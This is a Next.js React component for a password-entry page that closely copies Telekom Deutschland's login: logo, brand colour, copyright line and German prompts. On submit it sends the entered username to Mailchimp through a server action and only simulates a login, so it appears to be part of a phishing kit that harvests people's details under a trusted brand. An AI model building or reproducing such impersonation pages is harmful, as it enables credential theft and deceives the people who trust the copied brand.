"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Switch } from "@/components/ui/switch"
import { HelpCircle, Eye, EyeOff, User, ChevronDown, Loader2 } from "lucide-react"
import { submitToMailchimp } from "./actions"

export default function PasswordPage() {
  const router = useRouter()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(true)
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    // Get username from sessionStorage
    const storedUsername = sessionStorage.getItem("username")
    if (storedUsername) {
      setUsername(storedUsername)
    } else {
      // Redirect back if no username
      router.push("/")
    }
  }, [router])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const result = await submitToMailchimp({
        email: username,
        rememberMe,
      })

      if (!result.success) {
        console.error("[v0] Mailchimp submission failed:", result.error)
        // Continue with login even if Mailchimp fails
      } else {
        console.log("[v0] Mailchimp submission successful")
      }

      // Simulate login process
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Handle successful login
      console.log("[v0] Login successful:", { username, rememberMe })

      // You can redirect or show success message here
      // router.push("/dashboard")
    } catch (error) {
      console.error("[v0] Login error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleBack = () => {
    router.push("/")
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-500 via-gray-600 to-gray-700 flex flex-col">
        {/* Telekom Logo */}
        <div className="absolute top-0 left-0 w-24 h-24 bg-[#E20074] flex items-center justify-center">
          <span className="text-white text-5xl font-bold">T</span>
        </div>

        {/* Loading Content */}
        <div className="flex-1 flex items-center justify-center p-4">
          <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-12 flex flex-col items-center justify-center gap-6">
            <Loader2 className="w-16 h-16 text-[#E20074] animate-spin" />
            <h2 className="text-2xl font-bold text-black">Anmeldung läuft...</h2>
            <p className="text-gray-600 text-center">Bitte warten Sie, während wir Ihre Anmeldedaten überprüfen</p>
          </div>
        </div>

        {/* Footer */}
        <footer className="p-6 text-white text-sm flex justify-between items-center">
          <div>
            <p>© Telekom Deutschland GmbH</p>
            <p>26.26.1</p>
          </div>
          <div className="flex gap-6">
            <a href="#" className="hover:underline">
              Impressum
            </a>
            <a href="#" className="hover:underline">
              Datenschutz
            </a>
          </div>
        </footer>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-500 via-gray-600 to-gray-700 flex flex-col">
      {/* Telekom Logo */}
      <div className="absolute top-0 left-0 w-24 h-24 bg-[#E20074] flex items-center justify-center">
        <span className="text-white text-5xl font-bold">T</span>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-8 relative">
          {/* Help Icon */}
          <button className="absolute top-6 right-6 text-gray-600 hover:text-gray-800">
            <HelpCircle className="w-6 h-6" />
          </button>

          {/* User Avatar and Dropdown */}
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 rounded-full bg-gray-400 flex items-center justify-center">
              <User className="w-6 h-6 text-white" />
            </div>
            <button className="flex items-center gap-2 text-black font-medium hover:text-gray-700">
              <span>{username}</span>
              <ChevronDown className="w-4 h-4" />
            </button>
          </div>

          <h1 className="text-3xl font-bold mb-8 text-black">Passwort eingeben</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Password Input */}
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Passwort"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-12 px-4 pr-10 text-base border-gray-300 rounded-lg focus:border-[#E20074] focus:ring-[#E20074]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>

            <div>
              <a href="#" className="text-sm text-blue-600 hover:text-blue-800 underline">
                Passwort vergessen?
              </a>
            </div>

            <div className="flex items-center gap-3 pt-2">
              <Switch
                checked={rememberMe}
                onCheckedChange={setRememberMe}
                className="data-[state=checked]:bg-[#E20074]"
              />
              <span className="text-sm text-black">angemeldet bleiben</span>
              <button type="button" className="text-gray-500 hover:text-gray-700">
                <HelpCircle className="w-4 h-4" />
              </button>
            </div>

            <div className="pt-4">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 bg-[#E20074] hover:bg-[#C00060] text-white text-base font-semibold rounded-lg disabled:opacity-50"
              >
                ANMELDEN
              </Button>
            </div>

            <div>
              <button
                type="button"
                onClick={handleBack}
                className="text-sm text-blue-600 hover:text-blue-800 underline"
              >
                {"< Zurück"}
              </button>
            </div>
          </form>
        </div>
      </div>

      <footer className="p-6 text-white text-sm flex justify-between items-center">
        <div>
          <p>© Telekom Deutschland GmbH</p>
          <p>26.26.1</p>
        </div>
        <div className="flex gap-6">
          <a href="#" className="hover:underline">
            Impressum
          </a>
          <a href="#" className="hover:underline">
            Datenschutz
          </a>
        </div>
      </footer>
    </div>
  )
}
